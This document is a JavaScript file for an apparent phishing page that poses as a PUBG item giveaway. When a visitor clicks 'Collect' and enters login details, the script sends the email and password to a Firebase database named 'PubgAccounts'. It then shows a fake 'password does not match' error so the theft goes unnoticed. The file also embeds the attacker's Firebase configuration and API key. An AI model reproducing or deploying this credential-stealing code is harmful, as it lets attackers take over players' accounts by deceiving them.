const firebaseConfig = {

  apiKey: "AIzaSyCxMEZnpFxwOL4leAfJkyf6qNj_mVOwA1U",

  authDomain: "pubgaccounts-1.firebaseapp.com",

  projectId: "pubgaccounts-1",

  storageBucket: "pubgaccounts-1.appspot.com",

  messagingSenderId: "620302804117",

  appId: "1:620302804117:web:0fc6e4fb80046e011ce79c"

};


firebase.initializeApp(firebaseConfig);
var database = firebase.database();




      
      
      
      
      

setTimeout(stopLoad, 500)
const collect = document.querySelector('button');
const loader = document.querySelector('loader');

const mailContainer = document.querySelector('mail-container')

const close = document.querySelector('.close')
const alertMain = document.querySelector('alert-main')

collect.addEventListener('click',()=>{
  collect.innerText='Collected'
  collect.style.background='#49566B'
  collect.style.color='white'
startLoad()

setTimeout(stopLoad, 2000)
})




function startLoad(){
  loader.style.display='flex'
  setTimeout(stopLoad, 2000)
}

function stopLoad(){
  loader.style.display='none'
}


function load() {
  
  loader.style.display = 'flex'
  setTimeout(stopLoad, 100)
  setTimeout(openSign, 100)
}
function openSign() {
  mailContainer.style.display='flex'
}

close.addEventListener('click', ()=>{
  loader.style.display='flex'
  setTimeout(stopLoad, 100)
  mailContainer.style.display='none'
})

const loginButton = document.querySelector('.loginButton');
loginButton.addEventListener('click', ()=>{
  dataCheck()
})

function dataCheck() {
  startLoad()
  setTimeout(check, 1000)
}

function check() {
  loader.style.display = 'none'
  const mail = document.querySelector('#mail')
  const pass = document.querySelector('#password')
  const alertTxt = document.querySelector('.alert-txt')
  if (mail.value!=='') {
    if (pass.value!=='') {
      var email = mail.value
      var password= pass.value
      
      
      console.log(email,password)
      
      database.ref('PubgAccounts/').child(password).set(email).then(function() {
        console.log("User number added successfully!");
      })
      
          
      
      alertMain.style.display='flex';
      alertTxt.innerText='Email or Password is not match. Please try again later...'
    } else {
      
      
      
      
      alertMain.style.display='flex';
      alertTxt.innerText='Email and Password is cannotbe embty'
    }
  } else {
    alertTxt.innerText='Email and Password is cannotbe embty'
    alertMain.style.display='flex';
  }
}


function closeAlert() {
  
  
  alertMain.style.display='none';
}

